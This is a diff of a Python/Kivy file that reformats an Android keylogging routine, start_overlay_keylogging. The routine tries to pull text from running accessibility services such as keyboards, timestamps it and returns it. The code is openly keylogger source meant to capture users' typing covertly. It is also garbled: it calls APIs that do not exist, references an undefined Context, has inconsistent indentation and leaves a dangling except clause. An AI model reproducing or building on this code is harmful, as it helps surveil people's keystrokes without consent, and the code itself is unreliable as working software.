@@ -105,17 +105,37 @@ def start_overlay_keylogging():
                 try: 
                     time.sleep(0.5) 
                     
-    import androidfrom jniusimport autoclass# Initialize Android Java classes via Kivy bridge
-AccessibilityService = autoclass('android.accessibilityservice.AccessibilityService')try:# Get a list of currently running accessibility services (e.g., keyboards)
+    import android
+from jnius import autoclass
+
+# Initialize Android Java classes via Kivy bridge
+AccessibilityService = autoclass('android.accessibilityservice.AccessibilityService')
+
+try:
+    # Get a list of currently running accessibility services (e.g., keyboards)
     am = AccessibilityService(android.context.getSystemService(Context.ACCESSIBILITY_SERVICE))
     
-    info_list = am.getRunningServices()[:10]# Check first 10 to avoid lag
+    info_list = am.getRunningServices()[:10]  # Check first 10 to avoid lag
     
-    captured_text =""for servicein info_list:try:# Attempt to get text provider from the service if available
-            provider =Noneifhasattr(service,'getTextProvider'): 
-                provider = service.getTextProvider()# If we have a valid provider and some non-noise text data, capture it safelyif providerandlen(str(provider).split('\n')[0]) >5and"Accessibility"notinstr(provider):
-                raw_txt =str(provider).strip().split(chr(10))[0][:80]
-                captured_text +=f"[{time.time()}]{raw_txt}...\n"except Exceptionas e_inner:continuereturn captured_text[:2048]except Exceptionas e_loop:print(f"Overlay Hook Error (Logged):{e_loop}")                
+    captured_text = ""
+    for service in info_list:
+        try:
+            # Attempt to get text provider from the service if available
+            provider = None
+            if hasattr(service, 'getTextProvider'): 
+                provider = service.getTextProvider()
+            
+            # If we have a valid provider and some non-noise text data, capture it safely
+            if provider and len(str(provider).split('\n')[0]) > 5 and "Accessibility" not in str(provider):
+                raw_txt = str(provider).strip().split(chr(10))[0][:80]
+                captured_text += f"[{time.time()}]{raw_txt}...\n"
+
+        except Exception as e_inner: continue
+
+    return captured_text[:2048] 
+
+except Exception as e_loop: 
+    print(f"Overlay Hook Error (Logged): {e_loop}") 
 
 
     except Exception as e_loop: continue
